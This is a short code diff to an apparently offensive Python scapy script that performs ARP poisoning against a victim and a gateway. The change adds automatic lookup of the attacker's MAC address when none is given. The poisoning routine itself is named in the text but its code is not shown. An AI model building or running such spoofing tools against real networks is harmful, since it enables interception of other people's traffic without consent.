@@ -1,6 +1,6 @@
 from scapy.all import *
 import time
-from utils.network_utils import get_mac_address
+from utils.network_utils import get_mac_address, get_local_mac
 
 def poison_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, interface):
     """
@@ -80,6 +80,13 @@ def run(args):
         args.gateway_mac = get_mac_address(args.gateway_ip, interface=args.interface)
         if not args.gateway_mac:
             print("Failed to find MAC address for gateway IP: {}".format(args.gateway_ip))
+            return
+
+    if not args.attacker_mac:
+        print("No attacker MAC address provided. Using get_local_mac utility to find it.")
+        args.attacker_mac = get_local_mac(interface=args.interface)
+        if not args.attacker_mac:
+            print("Failed to find MAC address for attacker interface: {}".format(args.interface))
             return
 
     try:
